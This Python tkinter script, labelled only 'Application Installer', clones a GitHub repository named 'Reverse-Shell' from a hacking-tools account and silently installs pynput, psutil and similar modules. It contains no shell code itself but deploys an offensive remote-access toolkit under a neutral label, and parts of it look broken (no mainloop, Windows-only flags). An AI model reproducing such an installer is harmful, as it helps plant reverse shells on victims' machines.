import tkinter as tk
from tkinter import ttk
import importlib.util
import subprocess
import threading
import sys
import os
import shutil
import platform
from typing import List
from urllib.request import urlopen
from urllib.error import URLError

REQUIRED_MODULES = ['colorama', 'psutil', 'pynput', 'requests']
REPO_URL = 'https://github.com/H-ckingTools/Reverse-Shell.git'
LOCAL_REPO_DIR = os.path.join(os.getcwd(), 'Reverse-Shell')
GIT_TIMEOUT = 30  # seconds
INSTALL_TIMEOUT = 300 
CHECK_INTERNET_URL = 'http://www.google.com'
WINDOW_WIDTH = 500
WINDOW_HEIGHT = 250  # Slightly taller for better visibility

class AppInstaller:
    def __init__(self):
        self.running = True
        self.current_stage = ""
        self.root = tk.Tk()
        self.root.title("Application Installer")
        self.root.geometry(f"{WINDOW_WIDTH}x{WINDOW_HEIGHT}")
        self.root.resizable(False, False)
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        
        # Center the window
        self._center_window()
        
        # Configure styles
        self._configure_styles()
        
        # Create UI elements
        self._create_widgets()
        
        # Start installation process
        self._start_installation()

    def _center_window(self):
        """Center the window on the screen."""
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width // 2) - (WINDOW_WIDTH // 2)
        y = (screen_height // 2) - (WINDOW_HEIGHT // 2)
        self.root.geometry(f'+{x}+{y}')

    def _configure_styles(self):
        """Configure ttk styles."""
        self.style = ttk.Style()
        self.style.configure("TLabel", font=("Segoe UI", 10))
        self.style.configure("TProgressbar", thickness=20)
        self.style.configure("Red.TLabel", foreground="red")
        self.style.configure("Green.TLabel", foreground="green")

    def _create_widgets(self):
        """Create and arrange all UI widgets."""
        # Main label
        self.main_label = ttk.Label(self.root, text="Starting installation...", font=("Segoe UI", 11, "bold"))
        self.main_label.pack(pady=(15, 5))
        
        # Progress bar with percentage label
        self.progress_frame = ttk.Frame(self.root)
        self.progress_frame.pack(fill=tk.X, padx=20, pady=5)
        
        self.progress = ttk.Progressbar(self.progress_frame, length=400, mode='determinate')
        self.progress.pack(side=tk.LEFT, expand=True)
        
        self.progress_percent = ttk.Label(self.progress_frame, text="0%", width=4)
        self.progress_percent.pack(side=tk.RIGHT, padx=5)
        
        # Status label with current operation
        self.status_label = ttk.Label(self.root, text="Initializing...", font=("Segoe UI", 9))
        self.status_label.pack(pady=5)
        
        # Current stage label
        self.stage_label = ttk.Label(self.root, text="", font=("Segoe UI", 9, "italic"))
        self.stage_label.pack(pady=2)
        
        # Details text area with scrollbar
        self.details_frame = ttk.Frame(self.root)
        self.details_frame.pack(pady=5, fill=tk.BOTH, expand=True, padx=10)
        
        self.details_text = tk.Text(
            self.details_frame,
            height=5,
            wrap=tk.WORD,
            font=("Consolas", 9),
            padx=5,
            pady=5,
            state=tk.DISABLED
        )
        self.details_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        scrollbar = ttk.Scrollbar(self.details_frame, command=self.details_text.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.details_text.config(yscrollcommand=scrollbar.set)
        
        # Close button (initially hidden)
        self.close_button = ttk.Button(
            self.root,
            text="Close",
            command=self.on_close,
            state=tk.DISABLED
        )
        self.close_button.pack(pady=(5, 10))

    def _start_installation(self):
        """Start the installation process in a background thread."""
        self.install_thread = threading.Thread(target=self._installation_process, daemon=True)
        self.install_thread.start()
        self._update_progress_animation()

    def _update_progress_animation(self):
        """Update the progress bar animation."""
        if not self.running:
            return
            
        # Only animate if we're not in an active installation stage
        if not self.current_stage or "Complete" in self.current_stage or "Error" in self.current_stage:
            current_value = self.progress['value']
            if current_value < 100:
                self.progress['value'] = current_value + 1
            else:
                self.progress['value'] = 0
            
        self.progress_percent.config(text=f"{int(self.progress['value'])}%")
        self.root.after(100, self._update_progress_animation)

    def on_close(self):
        """Handle window close event."""
        self.running = False
        if hasattr(self, 'install_thread') and self.install_thread.is_alive():
            try:
                self.install_thread.join(timeout=1)
            except Exception:
                pass
        self.root.destroy()

    def _installation_process(self):
        """Main installation process running in background thread."""
        try:
            # Stage 1: Check internet connection
            self._set_stage("Checking internet connection...")
            if not self._check_internet_connection():
                raise ConnectionError("No internet connection detected")
            
            # Stage 2: Check and install Git
            self._set_stage("Checking Git installation...")
            git_path = self._ensure_git_installed()
            
            # Stage 3: Update repository
            self._set_stage("Updating repository...")
            self._update_repository(git_path)
            
            # Stage 4: Install dependencies
            self._set_stage("Installing dependencies...")
            self._install_dependencies()
            
            # Complete
            self._set_stage("Installation complete!")
            self._update_progress(100, "Installation Complete", "All components installed successfully!")
            self._log_message("Installation completed successfully.", success=True)
            self._enable_close_button()
            
        except Exception as e:
            self._set_stage("Installation failed!")
            self._update_progress(self.progress['value'], "Installation Error", f"Error: {str(e)}")
            self._log_message(f"Error: {str(e)}", error=True)
            self._log_message("Please check your internet connection and try again.", error=True)
            self._enable_close_button()

    def _set_stage(self, stage: str):
        """Set the current installation stage."""
        self.current_stage = stage
        self.root.after(0, lambda: self.stage_label.config(text=stage))

    def _update_progress(self, value: int, main: str, status: str):
        """Update progress and UI elements."""
        if not self.running:
            return
            
        def update():
            self.progress['value'] = value
            self.progress_percent.config(text=f"{int(value)}%")
            self.main_label.config(text=main)
            self.status_label.config(text=status)
            
        self.root.after(0, update)

    def _log_message(self, message: str, error: bool = False, success: bool = False):
        """Add message to log with optional styling."""
        if not self.running:
            return
            
        def append():
            self.details_text.config(state=tk.NORMAL)
            
            # Configure tags for styling
            if not hasattr(self, '_tags_configured'):
                self.details_text.tag_config('error', foreground='red')
                self.details_text.tag_config('success', foreground='green')
                self._tags_configured = True
                
            # Insert message with appropriate tag
            tag = 'error' if error else 'success' if success else ''
            self.details_text.insert(tk.END, message + '\n', tag)
            
            self.details_text.config(state=tk.DISABLED)
            self.details_text.see(tk.END)
            
        self.root.after(0, append)

    def _enable_close_button(self):
        """Enable the close button when installation is complete or failed."""
        self.root.after(0, lambda: self.close_button.config(state=tk.NORMAL))

    def _check_internet_connection(self) -> bool:
        """Check if there's an active internet connection."""
        self._update_progress(10, "Checking Requirements", "Verifying internet connection...")
        try:
            with urlopen(CHECK_INTERNET_URL, timeout=5) as response:
                self._log_message("Internet connection verified.")
                return True
        except URLError:
            self._log_message("No internet connection detected.", error=True)
            return False

    def _ensure_git_installed(self) -> str:
        """Ensure Git is installed and return the path to git executable."""
        self._update_progress(20, "Checking Requirements", "Looking for Git installation...")
        git_path = shutil.which('git')
        
        if git_path:
            self._log_message(f"Git found at: {git_path}")
            return git_path
            
        # Git not found - try to install it
        self._log_message("Git not found. Attempting to install...")
        
        if platform.system() == "Windows":
            # For Windows, we can't easily install Git automatically
            raise Exception("Git is required but not found. Please install Git from https://git-scm.com/")
        else:
            # For Linux/macOS, try to install via package manager
            try:
                if platform.system() == "Linux":
                    self._log_message("Installing Git via apt-get...")
                    subprocess.run(['sudo', 'apt-get', 'install', '-y', 'git'], 
                                 check=True, timeout=300)
                elif platform.system() == "Darwin":  # macOS
                    self._log_message("Installing Git via Homebrew...")
                    subprocess.run(['brew', 'install', 'git'], 
                                 check=True, timeout=300)
                
                git_path = shutil.which('git')
                if git_path:
                    self._log_message("Git installed successfully.")
                    return git_path
                else:
                    raise Exception("Git installation failed.")
                    
            except subprocess.CalledProcessError as e:
                raise Exception(f"Failed to install Git: {e.stderr.decode().strip()}")
            except subprocess.TimeoutExpired:
                raise Exception("Git installation timed out.")

    def _update_repository(self, git_path: str):
        """Update or clone the repository."""
        if os.path.isdir(LOCAL_REPO_DIR) and os.path.isdir(os.path.join(LOCAL_REPO_DIR, ".git")):
            self._update_progress(40, "Updating Application", "Pulling latest changes...")
            self._log_message("Existing repository found. Updating...")
            
            try:
                result = subprocess.run(
                    [git_path, 'pull'],
                    cwd=LOCAL_REPO_DIR,
                    check=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=GIT_TIMEOUT,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                self._log_message("Repository updated successfully.")
                self._update_progress(60, "Repository Updated", "Update complete")
            except subprocess.TimeoutExpired:
                raise Exception("Repository update timed out.")
            except subprocess.CalledProcessError as e:
                raise Exception(f"Failed to update repository: {e.stderr.decode().strip()}")
        else:
            self._update_progress(30, "Cloning Repository", "Downloading source code...")
            self._log_message("Cloning repository...")
            
            try:
                result = subprocess.run(
                    [git_path, 'clone', REPO_URL, LOCAL_REPO_DIR],
                    check=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=GIT_TIMEOUT,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                self._log_message("Repository cloned successfully.")
                self._update_progress(60, "Repository Cloned", "Download complete")
            except subprocess.TimeoutExpired:
                raise Exception("Repository clone timed out.")
            except subprocess.CalledProcessError as e:
                raise Exception(f"Failed to clone repository: {e.stderr.decode().strip()}")

    def _install_dependencies(self):
        """Install required Python dependencies."""
        missing = self._get_missing_modules()
        if not missing:
            self._log_message("All required modules are already installed.")
            self._update_progress(90, "Dependencies Check", "All modules present")
            return

        total = len(missing)
        self._log_message(f"Found {total} missing modules to install: {', '.join(missing)}")
        
        for i, module in enumerate(missing):
            if not self.running:
                break

            progress = 60 + int((i / total) * 40)
            self._update_progress(progress, "Installing Dependencies", 
                                f"Installing {module} ({i+1}/{total})")
            self._log_message(f"Installing {module}...")

            try:
                result = subprocess.run(
                    [sys.executable, "-m", "pip", "install", module],
                    check=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=INSTALL_TIMEOUT,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                self._log_message(f"Successfully installed {module}", success=True)
            except subprocess.TimeoutExpired:
                self._log_message(f"Timeout while installing {module}", error=True)
            except subprocess.CalledProcessError as e:
                self._log_message(f"Failed to install {module}: {e.stderr.decode().strip()}", error=True)

    def _get_missing_modules(self) -> List[str]:
        """Return a list of missing required modules."""
        return [m for m in REQUIRED_MODULES if not self._is_module_installed(m)]

    def _is_module_installed(self, module_name: str) -> bool:
        """Check if a Python module is installed."""
        try:
            return importlib.util.find_spec(module_name) is not None
        except Exception:
            return False

